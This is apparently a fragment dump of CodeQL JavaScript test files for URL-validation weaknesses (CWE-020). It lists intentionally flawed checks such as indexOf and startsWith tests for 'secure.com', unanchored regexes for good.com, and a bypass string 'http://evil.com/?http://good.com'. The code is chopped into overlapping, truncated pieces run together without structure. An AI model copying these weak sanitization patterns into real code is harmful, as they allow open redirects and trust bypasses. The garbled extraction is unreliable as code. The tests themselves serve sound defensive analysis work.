... e.com)/^(example.dev|example.com)(example.dev|example.com)example.dev|example.comexample.devexample.com^https?://.+.example\.com/var pri ... .com$';primary ... e.com$'example.com$new Reg ... imary);new Reg ... rimary)'test.' + primarytest.new Reg ... com$');new Reg ... .com$')'test.' ... e.com$'new Reg ... .com');new Reg ... e.com')'^http: ... le.com'/^http: ... .html/;/^http: ... \.html/^http:\/\/(..|...)\.example\.com\/index\.html(..|...)..|........^http:\/\/.\.example\.com\/index\.html/^(foo. ... ver)$/;/^(foo. ... ever)$/^(foo.example\.com|whatever)$(foo.example\.com|whatever)foo.example\.com|whateverfoo.example\.comfoowhatever/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-IncompleteUrlSubstringSanitization.js NOT OK, but not flagged// NOT  ... flagged OK (query param)// OK (query param) OK - a forward slash after the domain makes prefix checks safe.// OK - ... s safe. NOT OK - the url can be anywhere in the string.// NOT  ... string."internal""localhost""secure.com""secure.net"".secure.com""sub.secure."".sub.secure.">="https://secure.com""secure.com/""#"":"":/""://""//"":443""/some/path/""some/path""/index.html"":template:""https://secure.com:443""https://secure.com/"".cn"".jpg""index.html""index.js""index.php""index.css""secure=true""&auth="getCurrentDomain"tar.gz""https://example.internal""https://"'https://example.internal.org'"internal.com""https://example.internal:80"elsedoSomeThingWithTrustedURL"https://secure.com/foo/bar""https://secure.com/foo/bar-baz"(functi ... ng.\n});(functi ... ing.\n})functio ... ring.\n}{\n    x ... ring.\n}x.index ... !== -1;x.index ...  !== -1x.index ... ernal")x.indexOfx.index ... lhost")x.index ... e.com")secure.comsecurex.index ... e.net")secure.net.secure.comx.index ... cure.")sub.secure..sub.secure.x.index ... === -1;x.index ...  === -1x.index ...  === 0;x.index ... ) === 0x.index ... ) >= 0;x.index ... ") >= 0x.start ... .com");x.start ... e.com")x.startsWithhttps://secure.comhttps://securex.endsW ... .com");x.endsW ... e.com")x.endsWithx.start ... com/");x.start ... .com/")secure.com/x.index ... .com/")x.inclu ... .com");x.inclu ... e.com")x.includesx.indexOf("#")#x.indexOf(":")x.indexOf(":/")x.indexOf("://")x.indexOf("//")//x.indexOf(":443"):443x.index ... path/")/some/path/x.index ... /path")some/pathx.index ... .html")/index.html/indexx.index ... late:"):template:x.index ... m:443")"https: ... om:443"https://secure.com:443com:443"https: ... e.com/"https://secure.com/x.indexOf(".cn").cncnx.indexOf(".jpg").jpgjpgindex.htmlx.index ... ex.js")index.jsjsx.index ... x.php")index.phpphpx.index ... x.css")index.cssx.index ... =true")secure=truex.indexOf("&auth=")&auth=x.index ... main())getCurrentDomain()x.index ... origin)location.originx.index ... offset;x.index ...  offsetx.indexOf("tar.gz")tar.gztargz"https: ... ternal"https://example.internalhttps://examplex.index ... ps://")https://x.start ... rnal");x.start ... ernal")x.index ...  !== 0;x.index ... ) !== 0x.index ... l.org')'https: ... al.org'https://example.internal.orgorgx.endsW ... l.com")internal.comx.start ... l:80");x.start ... al:80")"https: ... nal:80"https://example.internal:80internal:80!(x.ind ... == -1);!(x.ind ... !== -1)(x.inde ... !== -1)!x.incl ... .com");!x.incl ... e.com")if(!x.i ... ;\n    }{ // NOT OK\n\n\t}{\n\t\tdoS ... ;\n    }doSomeT ... URL(x);doSomeT ... dURL(x)doSomeT ... stedURLx.start ... /bar");x.start ... o/bar")"https: ... oo/bar"https://secure.com/foo/barcom/foo/barx.index ... o/bar")x.index ... r-baz")"https: ... ar-baz"https://secure.com/foo/bar-bazcom/foo/bar-baz/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-SemiAnchoredRegExp.js real-world examples that have been anonymized a bit// real ... d a bit
	 * NOT OK: flagged
	 /*\n\t *  ... ed\n\t */ not flagged at the moment due to interior anchors// not  ... anchors not flagged at the moment due to the anchor not being for letters// not  ... letters
	 * MAYBE OK due to apparent complexity: not flagged
	 
	 * OK: not flagged
	  OK - possibly replacing too much, but not obviously a problem// OK - ... problemcoreRegExp/^a|//^a|b//a|^b//^a|^b//^a|b|c//a|^b|c//a|b|^c//^a|^b|c//(^a)|b//^a|(b)//^a|(^b)//^(a)|(b)//a|b$//a$|b//a$|b$//a|b|c$//a|b$|c//a$|b|c//a|b$|c$//a|(b$)//(a)|b$//(a$)|b$//(a)|(b)$//^good.com|better.com//^good\.com|better\.com//^good\\.com|better\\.com//^good\\\.com|better\\\.com//^good\\\\.com|better\\\\.com//^foo|bar|baz$//^foo|%/coreString"^a|""^a|b""a|^b""^a|^b""^a|b|c""a|^b|c""a|b|^c""^a|^b|c""(^a)|b""^a|(b)""^a|(^b)""^(a)|(b)""a|b$""a$|b""a$|b$""a|b|c$""a|b$|c""a$|b|c""a|b$|c$""a|(b$)""(a)|b$""(a$)|b$""(a)|(b)$"'^good.com|better.com''^good\.com|better\.com''^good\\.com|better\\.com''^good\\\.com|better\\\.com''^good\\\\.com|better\\\\.com'realWorld/(\.xxx)|(\.yyy)|(\.zzz)$//(^left|right|center)\sbottom$//\.xxx|\.yyy|\.zzz$/ig/\.xxx|\.yyy|zzz$//^([A-Z]|xxx[XY]$)//^(xxx yyy zzz)|(xxx yyy)/i/^(xxx yyy zzz)|(xxx yyy)|(1st( xxx)? yyy)|xxx|1st/i/^(xxx:)|(yyy:)|(zzz:)//^(xxx?:)|(yyy:zzz\/)//^@media|@page//^\s*(xxx?|yyy|zzz):|xxx:yyy\///^click|mouse|touch//^http:\/\/good\.com|http:\/\/better\.com//^https?:\/\/good\.com|https?:\/\/better\.com//^mouse|touch|click|contextmenu|drop|dragover|dragend//^xxx:|yyy:/i/_xxx|_yyy|_zzz$//em|%$//(?:^[#?]?|&)([^=&]+)(?:=([^&]*))?/g/(^\s*|;\s*)\*.*;/m/(^\s*|\[)(?:xxx|yyy_(?:xxx|yyy)|xxx|yyy(?:xxx|yyy)?|xxx|yyy)\b/m/\s\S| \t|\t |\s$//\{[^}{]*\{|\}[^}{]*\}|\{[^}]*$/g/^((\+|\-)\s*\d\d\d\d)|((\+|\-)\d\d\:?\d\d)//^(\/\/)|([a-z]+:(\/\/)?)//^[=?!#%@$]|!(?=[:}])//^[\[\]!:]|[<>]//^for\b|\b(?:xxx|yyy)\b/i/^if\b|\b(?:xxx|yyy|zzz)\b/i/$^|only-match/g/(#.+)|#$//(NaN| {2}|^$)//[^\n]*(?:\n|[^\n]$)/g/^$|\/(?:xxx|yyy)zzz/i/^(\/|(xxx|yyy|zzz)$)//^9$|27//^\+|\s*/g/xxx_yyy=\w+|^$//^(?:mouse|contextmenu)|click/replaceTest(functi ...  OK\n});(functi ... / OK\n})functio ... // OK\n}{\n\t/^a| ... // OK\n}/^a|/;^a|^a/^a|b/;^a|b/a|^b/;a|^b^b/^a|^b/;^a|^b/^a|b|c/;^a|b|cc/a|^b|c/;a|^b|c/a|b|^c/;a|b|^c^c/^a|^b|c/;^a|^b|c/(^a)|b/;(^a)|b(^a)/^a|(b)/;^a|(b)(b)/^a|(^b)/;^a|(^b)(^b)/^(a)|(b)/;^(a)|(b)^(a)(a)/a|b$/;a|b$b$/a$|b/;a$|ba$/a$|b$/;a$|b$/a|b|c$/;a|b|c$c$/a|b$|c/;a|b$|c/a$|b|c/;a$|b|c/a|b$|c$/;a|b$|c$/a|(b$)/;a|(b$)(b$)/(a)|b$/;(a)|b$/(a$)|b$/;(a$)|b$(a$)/(a)|(b)$/;(a)|(b)$(b)$/^good. ... r.com/;/^good. ... er.com/^good.com|better.com^good.comgoodbetter.combetter/^good\ ... \.com/;/^good\ ... r\.com/^good\.com|better\.com^good\.combetter\.com/^good\ ... \\.com/^good\\.com|better\\.com^good\\.combetter\\.com^good\\\.com|better\\\.com^good\\\.combetter\\\.com^good\\\\.com|better\\\\.com^good\\\\.combetter\\\\.com/^foo|bar|baz$/;^foo|bar|baz$^foobarbaz$baz/^foo|%/;^foo|%%(functi ... T OK\n})functio ... OT OK\n}{\n\tnew  ... OT OK\n}new RegExp("^a|");new RegExp("^a|")new RegExp("^a|b");new RegExp("^a|b")new RegExp("a|^b");new RegExp("a|^b")new RegExp("^a|^b");new RegExp("^a|^b")new Reg ... |b|c");new RegExp("^a|b|c")new Reg ... ^b|c");new RegExp("a|^b|c")new Reg ... b|^c");new RegExp("a|b|^c")new Reg ... |^b|c")new Reg ... a)|b");new RegExp("(^a)|b")new Reg ... |(b)");new RegExp("^a|(b)")new Reg ... (^b)");new Reg ... |(^b)")new Reg ... )|(b)")new RegExp("a|b$");new RegExp("a|b$")new RegExp("a$|b");new RegExp("a$|b")new RegExp("a$|b$");new RegExp("a$|b$")new Reg ... b|c$");new RegExp("a|b|c$")new Reg ... b$|c");new RegExp("a|b$|c")new RegExp("a$|b|c")new Reg ... $|c$");new Reg ... b$|c$")new Reg ... (b$)");new RegExp("a|(b$)")new Reg ... )|b$");new RegExp("(a)|b$")new Reg ... $)|b$")new Reg ... (b)$");new Reg ... |(b)$")new Reg ... r.com')'^good. ... er.com'new Reg ... \.com')'^good\ ... r\.com''^good\ ... \\.com'(functi ... k/;\n});(functi ... ck/;\n})functio ... ick/;\n}{\n\t// r ... ick/;\n}/(\.xxx ... zzz)$/;/(\.xxx ... .zzz)$/(\.xxx)|(\.yyy)|(\.zzz)$(\.xxx)\.xxxxxx(\.yyy)\.yyyyyy(\.zzz)$(\.zzz)\.zzzzzz/(^left ... ttom$/;/(^left ... ottom$/(^left|right|center)\sbottom$(^left|right|center)^left|right|center^leftcenter\s/\.xxx| ... zz$/ig;/\.xxx| ... zzz$/ig\.xxx|\.yyy|\.zzz$\.zzz$/\.xxx|\.yyy|zzz$/;\.xxx|\.yyy|zzz$zzz$/^([A-Z]|xxx[XY]$)/;^([A-Z]|xxx[XY]$)([A-Z]|xxx[XY]$)[A-Z]|xxx[XY]$[A-Z]A-ZAZxxx[XY]$[XY]XY/^(xxx  ... yyy)/i;/^(xxx  ...  yyy)/i^(xxx yyy zzz)|(xxx yyy)^(xxx yyy zzz)(xxx yyy zzz)xxx yyy zzz(xxx yyy)xxx yyy/^(xxx  ... |1st/i;/^(xxx  ... x|1st/i^(xxx yyy zzz)|(xxx yyy)|(1st( xxx)? yyy)|xxx|1st(1st( xxx)? yyy)1st( xxx)? yyy1st( xxx)?( xxx) xxx yyy/^(xxx: ... zzz:)/;/^(xxx: ... (zzz:)/^(xxx:)|(yyy:)|(zzz:)^(xxx:)(xxx:)xxx:(yyy:)yyy:(zzz:)zzz:/^(xxx? ... zz\/)/;/^(xxx? ... zzz\/)/^(xxx?:)|(yyy:zzz\/)^(xxx?:)(xxx?:)xxx?:xxx?(yyy:zzz\/)yyy:zzz\/yyy:zzz/^@media|@page/;^@media|@page^@media@media@page/^\s*(x ... yyy\//;/^\s*(x ... :yyy\//^\s*(xxx?|yyy|zzz):|xxx:yyy\/^\s*(xxx?|yyy|zzz):\s*(xxx?|yyy|zzz)xxx?|yyy|zzzxxx?xxx:yyy\/xxx:yyy/^click ... touch/;^click|mouse|touch^clickmousetouch/^http: ... \.com/;/^http: ... r\.com/^http:\/\/good\.com|http:\/\/better\.com^http:\/\/good\.comhttp:\/\/better\.com/^https ... \.com/;/^https ... r\.com/^https?:\/\/good\.com|https?:\/\/better\.com^https?:\/\/good\.comhttps?:\/\/better\.com/^mouse ... agend/;/^mouse ... ragend/^mouse|touch|click|contextmenu|drop|dragover|dragend^mousecontextmenudropdragoverdragend/^xxx:|yyy:/i;^xxx:|yyy:^xxx:/_xxx|_yyy|_zzz$/;_xxx|_yyy|_zzz$_xxx_yyy_zzz$_zzz/em|%$/;em|%$em%$/(?:^[# ... *))?/g;/(?:^[# ... ]*))?/g(?:^[#?]?|&)([^=&]+)(?:=([^&]*))?(?:^[#?]?|&)^[#?]?|&^[#?]?[#?]?[#?]&([^=&]+)[^=&]+[^=&](?:=([^&]*))?(?:=([^&]*))=([^&]*)([^&]*)[^&]*[^&]/(^\s*|;\s*)\*.*;/m;(^\s*|;\s*)\*.*;(^\s*|;\s*)^\s*|;\s*^\s*;\s*\*/(^\s*| ... y)\b/m;/(^\s*| ... yy)\b/m(^\s*|\[)(?:xxx|yyy_(?:xxx|yyy)|xxx|yyy(?:xxx|yyy)?|xxx|yyy)\b(^\s*|\[)^\s*|\[\[(?:xxx|yyy_(?:xxx|yyy)|xxx|yyy(?:xxx|yyy)?|xxx|yyy)xxx|yyy_(?:xxx|yyy)|xxx|yyy(?:xxx|yyy)?|xxx|yyyyyy_(?:xxx|yyy)yyy_(?:xxx|yyy)xxx|yyyyyy(?:xxx|yyy)?(?:xxx|yyy)?\b/\s\S| \t|\t |\s$/;\s\S| \t|\t |\s$\s\S\S \t\t\t \s$/\{[^}{ ... }]*$/g;/\{[^}{ ... ^}]*$/g\{[^}{]*\{|\}[^}{]*\}|\{[^}]*$\{[^}{]*\{\{[^}{]*[^}{]\}[^}{]*\}\}\{[^}]*$[^}]*[^}]/^((\+| ... \d\d)/;/^((\+| ... ?\d\d)/^((\+|\-)\s*\d\d\d\d)|((\+|\-)\d\d\:?\d\d)^((\+|\-)\s*\d\d\d\d)((\+|\-)\s*\d\d\d\d)(\+|\-)\s*\d\d\d\d(\+|\-)\+|\-\+\-\d((\+|\-)\d\d\:?\d\d)(\+|\-)\d\d\:?\d\d\:?\:/^(\/\/ ... \/)?)/;/^(\/\/ ... /\/)?)/^(\/\/)|([a-z]+:(\/\/)?)^(\/\/)(\/\/)\/\/([a-z]+:(\/\/)?)[a-z]+:(\/\/)?[a-z]+(\/\/)?/^[=?!# ... [:}])/;/^[=?!# ... =[:}])/^[=?!#%@$]|!(?=[:}])^[=?!#%@$][=?!#%@$]@!(?=[:}])(?=[:}])[:}]/^[\[\]!:]|[<>]/;^[\[\]!:]|[<>]^[\[\]!:][\[\]!:]\][<>]<>/^for\b ... y)\b/i;/^for\b ... yy)\b/i^for\b|\b(?:xxx|yyy)\b^for\b\b(?:xxx|yyy)\b/^if\b| ... z)\b/i;/^if\b| ... zz)\b/i^if\b|\b(?:xxx|yyy|zzz)\b^if\b\b(?:xxx|yyy|zzz)\b(?:xxx|yyy|zzz)xxx|yyy|zzz/$^|only-match/g;$^|only-match$^only-match/(#.+)|#$/;(#.+)|#$(#.+)#.+#$/(NaN| {2}|^$)/;(NaN| {2}|^$)NaN| {2}|^$ {2}^$/[^\n]* ... n]$)/g;/[^\n]* ... \n]$)/g[^\n]*(?:\n|[^\n]$)[^\n]*[^\n]\n
(?:\n|[^\n]$)\n|[^\n]$[^\n]$/^$|\/( ... )zzz/i;/^$|\/( ... y)zzz/i^$|\/(?:xxx|yyy)zzz\/(?:xxx|yyy)zzz/^(\/|( ... zz)$)/;/^(\/|( ... zzz)$)/^(\/|(xxx|yyy|zzz)$)(\/|(xxx|yyy|zzz)$)\/|(xxx|yyy|zzz)$(xxx|yyy|zzz)$(xxx|yyy|zzz)/^9$|27/;^9$|27^9$27/^\+|\s*/g;^\+|\s*^\+/xxx_yyy=\w+|^$/;xxx_yyy=\w+|^$xxx_yyy=\w+xxx_yyy=\w+\w/^(?:mo ... click/;/^(?:mo ... |click/^(?:mouse|contextmenu)|click^(?:mouse|contextmenu)(?:mouse|contextmenu)mouse|contextmenufunctio ... oblem\n}{\n\tretu ... oblem\n}return  ... /, '');x.repla ... b/, '')x.replace/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-UnanchoredUrlRegExp.js NOT OK - missing post-anchor// NOT  ... -anchor NOT OK, referenced below// NOT  ... d below g or .replace?// g or .replace? missing context of use// miss ...  of use ditto// ditto check optional successsor to TLD// chec ...  to TLD replace and spaces// repl ...  spaces not a url// not a url replace// replace replace and space// replace and space OK, has no domain name// OK,  ... in name OK, the other disjunction doesn't match a hostname// OK,  ... ostname"http://evil.com/?http://good.com""https?://good.com""^https?://good.com"/^https?:\/\/good.com/"(^https?://good1.com)|(^https?://good2.com)""(https?://good.com)|(^https?://goodie.com)"/https?:\/\/good.com/"something""other""x.commissary""https?://good.com:8080"trustedUrlsisTrustedUrltrustedUrl/https?:\/\/good.com\/([0-9]+)/"https://verygood.com/?id=""s""""verygood.com/?id="/https:\/\/cdn\.ampproject\.org\/v0\/amp-story-0\.1\.js/g'/dist/v0/amp-story-1.0.max.js'urlPatterns/youtube.com\/embed\/([a-z0-9\?&=\-_]+)/i'iframe'560314'//www.youtube.com/embed/$1'allowFullscreenFhelpersdefaultsyoutubematcher/(youtube\.com|youtu\.be)\/(watch\?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)).*/iautohidehdwmode'opaque'enablejsapi'//www.youtube.com/embed/$3'/youtu\.be\/([\w\-.]+)/425350/youtube\.com(.+)v=([^&]+)/'//www.youtube.com/embed/$2'/vimeo\.com\/([0-9]+)/'//player.vimeo.com/video/$1?title=0&byline=0&portrait=0&color=8dc7dc'"(Pingdom.com_bot_version_)(\\d+)\\.(\\d+)"/See https:\/\/github\.com\/Squirrel\/Squirrel\.Mac\/issues\/182 for more information/'See [this link](https://github.com/Microsoft/vscode/issues/7426#issuecomment-425093469) for more information'sharedScript/<script\s.*src="(app:\/\/.+\.gaiamobile\.org)?\/?(shared\/.+)".*>/reporepoURL/http(s)?:\/\/(\d+\.)?github.com\//gicmp/<option value="http:\/\/codemirror.net\/">HEAD<\/option>/"<option value=\"http://codemirror.net/\">HEAD</option>\n        <option value=\"http://marijnhaverbeke.nl/git/codemirror?a=blob_plain;hb="";f=\">""</option>"helpMsg/For help see https:\/\/nodejs.org\/en\/docs\/inspector\s*/pkg/<a:skin.*?\s+xmlns:a="http:\/\/ajax.org\/2005\/aml"/m/engine.io/"$&-client"/\.com|\.org//example\.com|whatever/{\n\n\tif  ... tname\n}if ("ht ... m")) {}"http:/ ... d.com")"http:/ ... ".match"http:/ ... od.com"http://evil.com/?http://good.comhttp://evilhttp://goodhttps?://good.com://goodif ("ht ... "))) {}"http:/ ... .com"))new Reg ... d.com")^https?://good.comif ("ht ... m/)) {}"http:/ ... d.com/)/^https ... od.com/^https?:\/\/good.comif ("ht ... )")) {}"http:/ ... .com)")"(^http ... 2.com)"(^https?://good1.com)|(^https?://good2.com)(^https?://good1.com)^https?://good1.com://good1(^https?://good2.com)^https?://good2.com://good2"(https ... e.com)"(https?://good.com)|(^https?://goodie.com)(https?://good.com)(^https?://goodie.com)^https?://goodie.com://goodie/https? ... .com");/https? ... d.com")/https? ... m/.exec/https? ... od.com/https?:\/\/good.comnew Reg ... ").exec"http:/ ... .com");"http:/ ... .searchnew Reg ... ").testif ("so ... r")) {}"someth ... other")"something".matchsomethingif ("so ... y")) {}"someth ... ssary")x.commissarycommissaryif ("ht ... 0")) {}"http:/ ... :8080")"https? ... m:8080"https?://good.com:8080com:8080let tru ... hor\n\t];trusted ... chor\n\t][\n\t\t"ht ... chor\n\t]functio ... lse;\n\t}{\n\t\tfor ... lse;\n\t}for (le ... ue;\n\t\t}let trustedUrl{\n\t\t\tif ... ue;\n\t\t}if (url ... n true;url.mat ... tedUrl)url.matchreturn true;return false;/https? ... c(url);/https? ... ec(url)/https? ... )/.exec/https? ... 0-9]+)/https?:\/\/good.com\/([0-9]+)([0-9]+)[0-9]+[0-9]0-9"https: ... rl)[0];"https: ... url)[0]"https: ... m/?id="https://verygood.com/?id=https://verygoodid=/https? ... url)[0]"http"  ... rl)[0];"http"  ... url)[0]"http"  ... m/?id=""http"  ... + "://""http"  ... s": "")(secure? "s": "")secure? "s": ""verygood.com/?id=verygood"http"  ... l)[0]);"http"  ... rl)[0])("veryg ... rl)[0])"verygo ... url)[0]file =  ... js'\n\t);file =  ... .js'\n\t)file.re ... .js'\n\t)file.replace/https: ... 1\.js/ghttps:\/\/cdn\.ampproject\.org\/v0\/amp-story-0\.1\.jscdnampprojectv0amp-story-0hostNam ... max.js''/dist/ ... max.js'/dist/v0/amp-story-1.0.max.js/dist/v0/amp-story-1const u ... e\n\t\t}];urlPatt ... ue\n\t\t}][\n\t\t{\n\t ... ue\n\t\t}]{\n\t\t\tre ... rue\n\t\t}regex:  ... -_]+)/i/youtub ... -_]+)/iyoutube.com\/embed\/([a-z0-9\?&=\-_]+)embed([a-z0-9\?&=\-_]+)[a-z0-9\?&=\-_]+[a-z0-9\?&=\-_]\?_type: 'iframe'iframew: 560h: 314url: '/ ... bed/$1''//www. ... bed/$1'//www.youtube.com/embed/$1//wwwcom/embed/allowFu ... n: trueF.helpe ... \n\t\t\t}}}F.helpers.mediaF.helpers{\n\t\tdef ... \n\t\t\t}}}default ... '\n\t\t\t}}{\n\t\t\tyo ... '\n\t\t\t}}youtube ... 3'\n\t\t\t}{\n\t\t\t\tm ... 3'\n\t\t\t}matcher ... *)).*/i/(youtu ... *)).*/i(youtube\.com|youtu\.be)\/(watch\?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)).*(youtube\.com|youtu\.be)youtube\.com|youtu\.beyoutube\.comyoutu\.beyoutu(watch\?v=|v\/|u\/|embed\/?)?(watch\?v=|v\/|u\/|embed\/?)watch\?v=|v\/|u\/|embed\/?watch\?v=v=v\/vu\/embed\/?\/?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*))videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)videoseries\?list=(.*)videoserieslist=(.*)[\w-]{11}[\w-]\?listType=(.*)&list=(.*)listType=&list=params  ... 1\n\t\t\t\t}{\n\t\t\t\t\t ... 1\n\t\t\t\t}autoplay    : 1autohide    : 1fs          : 1rel         : 0hd          : 1wmode   ... opaque'opaqueenablejsapi : 1type : 'iframe'url  :  ... bed/$3''//www. ... bed/$3'//www.youtube.com/embed/$3var url ... '},\n\t];urlPatt ... c'},\n\t][\n\t\t{re ... c'},\n\t]{regex: ... ed/$1'}regex:  ... \-.]+)//youtu\ ... \-.]+)/youtu\.be\/([\w\-.]+)([\w\-.]+)[\w\-.]+[\w\-.]w: 425h: 350{regex: ... ed/$2'}regex:  ... [^&]+)//youtub ... [^&]+)/youtube\.com(.+)v=([^&]+)([^&]+)[^&]+url: '/ ... bed/$2''//www. ... bed/$2'//www.youtube.com/embed/$2{regex: ... dc7dc'}regex:  ... 0-9]+)//vimeo\ ... 0-9]+)/vimeo\.com\/([0-9]+)vimeourl: '/ ... 8dc7dc''//play ... 8dc7dc'//player.vimeo.com/video/$1?title=0&byline=0&portrait=0&color=8dc7dc//playercom/video/1?title=0&byline=0&portrait=0&color=8dc7dcnew Reg ... \\d+)")"(Pingd ... (\\d+)"(Pingdom.com_bot_version_)(\d+)\.(\d+)(Pingdom.com_bot_version_)Pingdom.com_bot_version_Pingdomcom_bot_version_(\d+)\d+error.r ... tion');error.r ... ation')error.replace/See ht ... mation/See https:\/\/github\.com\/Squirrel\/Squirrel\.Mac\/issues\/182 for more informationSee https:githubSquirrelMacissues182 for more information'See [t ... mation'See [this link](https://github.com/Microsoft/vscode/issues/7426#issuecomment-425093469) for more informationSee [this link]l(https://github.com/Microsoft/vscode/issues/7426#issuecomment-425093469)https://github.com/Microsoft/vscode/issues/7426#issuecomment-425093469https://githubcom/Microsoft/vscode/issues/7426#issuecomment-425093469 for more informationvar sha ... )".*>/;sharedS ... +)".*>//<scrip ... +)".*>/<script\s.*src="(app:\/\/.+\.gaiamobile\.org)?\/?(shared\/.+)".*><scriptsrc="(app:\/\/.+\.gaiamobile\.org)?(app:\/\/.+\.gaiamobile\.org)app:\/\/.+\.gaiamobile\.orgapp:gaiamobile(shared\/.+)shared\/.+shared"const r ... gi, '')repo =  ... gi, '')repoURL ... gi, '')repoURL.replace/http(s ... om\//gihttp(s)?:\/\/(\d+\.)?github.com\/(s)?(s)(\d+\.)?(\d+\.)\d+\.cmp.rep ... ion>");cmp.rep ... tion>")cmp.replace/<optio ... ption>/<option value="http:\/\/codemirror.net\/">HEAD<\/option><option value="http:codemirror">HEAD<option>"<optio ... ption>""<optio ...  number"<optio ... ;f=\">""<optio ... in;hb="<option value="http://codemirror.net/">HEAD</option>
        <option value="http://marijnhaverbeke.nl/git/codemirror?a=blob_plain;hb=<option value="http://codemirrornet/">HEAD</option>
        <option value="http://marijnhaverbekenl/git/codemirror?a=blob_plain;hb=;f="></option>const h ... or\s*/;helpMsg ... tor\s*//For he ... tor\s*/For help see https:\/\/nodejs.org\/en\/docs\/inspector\s*For help see https:nodejsendocsinspectormsg = m ... g, '');msg = m ... sg, '')msg.rep ... sg, '')msg.replacepkg.sou ... aml"/m)pkg.source.matchpkg.source/<a:ski ... /aml"/m<a:skin.*?\s+xmlns:a="http:\/\/ajax.org\/2005\/aml"<a:skin.*?\s+xmlns:a="http:2005aml"path.re ... ient");path.re ... lient")path.replaceengine.ioengineio$&-client&-client/\.com|\.org/;\.com|\.org\.com\.org/exampl ... tever/;/exampl ... atever/example\.com|whateverexample\.com/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-UntrustedDataToExternalAPI.js no need to report; has known taint step// no n ... nt step should not be treated as individual named parameters// shou ... ametersexternalLib'external-lib'untrustedCONFIG'x''y''foo'getDeepUntrusted'/foo'reqreslocalsjsonSafeParse'json-safe-parse''lodash.merge'let ext ... -lib');externa ... l-lib')require ... l-lib')external-liblet unt ... w.name;untrust ... ow.namewindow.nameexterna ... usted);externa ... rusted)externa ... sted});externa ... usted}){x: untrusted}x: untrusted...untrusted...window.CONFIGwindow.CONFIGexterna ... ted });externa ... sted }){ ...untrusted }externa ...  'y']);externa ... , 'y'])['x', u ... d, 'y']externa ...   }\n});externa ...    }\n}){\n    x ...     }\n}x: {\n   ... }\n    }{\n      ... }\n    }y: {\n   ...       }{\n      ...       }z: untrustedfunctio ...     }\n}{\n    r ...     }\n}return  ... }\n    }x: {\n   ...       }z: [JSO ... usted)][JSON.p ... usted)]JSON.pa ... rusted)externa ... ted());externa ... sted())getDeepUntrusted()externa ... d);\n});externa ... ed);\n})externalLib.get/foo(req, r ... ted);\n}{\n    r ... ted);\n}res.send(untrusted);res.send(untrusted)res.sendreq.app ... usted);req.app ... rusted)req.app ... ing.fooreq.app ... methingreq.app.localsreq.applet jso ... arse');jsonSaf ... parse')require ... parse')json-safe-parsejsonSaf ... usted);jsonSaf ... rusted)let mer ... erge');merge = ... merge')require ... merge')lodash.mergelodashmerge({ ... ted\n});merge({ ... sted\n}){\n    x ... usted\n}y: untrusted/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-020/tst-escapes.js (the lines of this file are not annotated with alert expectations)// (the ... ations) no backslashes// no backslashes backslashes// backslashes many backslashes// many backslashes string vs regexp// string vs regexp other// other effective escapes// effective escapes effectively escaped after all// effe ... ter all"abcdefghijklmnopqrstuvxyz""ABCDEFGHIJKLMNOPQRSTUVXYZ""`1234567890-=""~!@#$%^&*()_+""[]'\\,./""{}\"|<>?"" ""\a\b\c\d\e\f\g\h\i\j\k\l\m\n\o\p\q\r\s\t\\u\v\\x\y\z""\A\B\C\D\E\F\G\H\I\J\K\L\M\N\O\P\Q\R\S\T\U\V\X\Y\Z""\`\1\2\3\4\5\6\7\8\9\0\-\=""\~\!\@\#\$\%\^\&\*\(\)\_\+""\[\]\'\\,\.\/""\{\}\\\"\|\<\>\?""\ "/\a\b\c\d\e\f\g\h\i\j\k\l\m\n\o\p\q\r\s\t\u\v\\x\y\z"//\A\B\C\D\E\F\G\H\I\J\K\L\M\N\O\P\Q\R\S\T\U\V\X\Y\Z//\`\1\2\3\4\5\6\7\8\9\0\-\=//\~\!\@\#\$\%\^\&\*\(\)\_\+//\[\]\'\\,\.\///\{\}\"\|\<\>\?//\ /"\a""\\a""\\\a""\\\\a""\\\\\a""\\\\\\a""\\\\\\\a""\\\\\\\\a""\\\\\\\\\a""\\\\\\\\\\a""\."/\/\\\/\\\\\//"\uaaaa\uAAAA\uFFFF\u1000""\xaaaa\xAAAA\xFFFF\x1000""'\'\\'""\"\\\""'"\"\\"''\'\\\''"^\\\\Q\\\\E$""/\\*""/\
""[\.]""a[b\.c]d""\b"\k\\k\d\\d\k\\k\d\\d"\]""\\]""\\\]""x\\\]""\\\\]""\\\\\]""\\\\\\]""\\\\\\\]""\\\\\\\\]""\\\\\\\\\]"RegExp( ... vxyz");RegExp( ... uvxyz")"abcdef ... tuvxyz"abcdefghijklmnopqrstuvxyzRegExp( ... VXYZ");RegExp( ... UVXYZ")"ABCDEF ... TUVXYZ"ABCDEFGHIJKLMNOPQRSTUVXYZRegExp( ... 90-=");RegExp( ... 890-=")`1234567890-=RegExp( ... ()_+");RegExp( ... *()_+")~!@#$%^&*()_+~!@#&*()_+RegExp("[]'\\,./");RegExp("[]'\\,./")[]'\,./[]'\,RegExp("{}\"|<>?");RegExp("{}\"|<>?"){}"|<>?RegExp(" ");RegExp(" ")RegExp( ... \y\z");RegExp( ... x\y\z")"\a\b\c ... \x\y\z"acdeghijklm
